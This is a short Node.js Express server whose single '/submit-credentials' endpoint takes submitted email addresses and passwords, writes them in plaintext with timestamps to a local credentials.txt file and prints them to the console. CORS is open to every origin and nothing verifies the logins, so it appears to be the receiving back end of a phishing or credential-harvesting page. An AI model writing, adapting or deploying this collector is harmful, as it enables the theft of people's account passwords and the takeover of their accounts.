const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();

const PORT = process.env.PORT || 5000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());

app.post("/submit-credentials", (req, res) => {
  const { email, password } = req.body;

  if (email && password) {
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - Email: ${email}, Password: ${password}\n`;

    const logPath = path.join(__dirname, "credentials.txt");

    fs.appendFile(logPath, logEntry, (err) => {
      if (err) {
        console.error("Error saving credentials:", err);
        return res.status(500).json({ message: "Internal Server Error" });
      }
      console.log("Credentials saved:", logEntry.trim());
      res.status(200).json({ message: "Credentials received" });
    });
  } else {
    res.status(400).json({ message: "Invalid input" });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
